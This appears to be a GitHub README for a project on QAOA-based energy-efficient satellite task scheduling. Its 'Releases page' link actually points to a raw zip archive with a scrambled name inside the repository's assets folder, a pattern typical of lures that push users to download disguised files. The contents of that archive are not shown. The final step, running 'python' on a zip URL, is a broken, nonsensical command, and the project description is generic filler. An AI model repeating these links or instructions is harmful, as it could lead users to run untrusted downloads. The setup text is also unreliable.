## 📖 Introduction 

This repository demonstrates the implementation of the QAOA algorithm for energy-efficient satellite task scheduling. Our goal is to help you manage satellite tasks more efficiently, leading to better use of resources and reduced operational costs.

## 🚀 Getting Started

To get started, follow these simple steps:

1. **Download the Software**  
   Visit the [Releases page](https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip) to download the application files.

2. **Prepare Your System**  
   Ensure that your computer meets the following requirements:
   - Operating System: Windows 10 or higher, macOS, or a recent Linux distribution
   - Python Version: 3.7 or higher installed on your machine
   - Internet connection for downloading the application and any necessary dependencies

3. **Install Necessary Dependencies**  
   The software may need specific libraries to run correctly. Open a command prompt or terminal and install the required Python packages by running the following commands:

   ```
   pip install numpy pandas matplotlib
   ```

4. **Run the Application**  
   After installation, locate the downloaded files. Open the command prompt or terminal in the folder where the application is located. Run the application using:

   ```
   python https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip
   ```
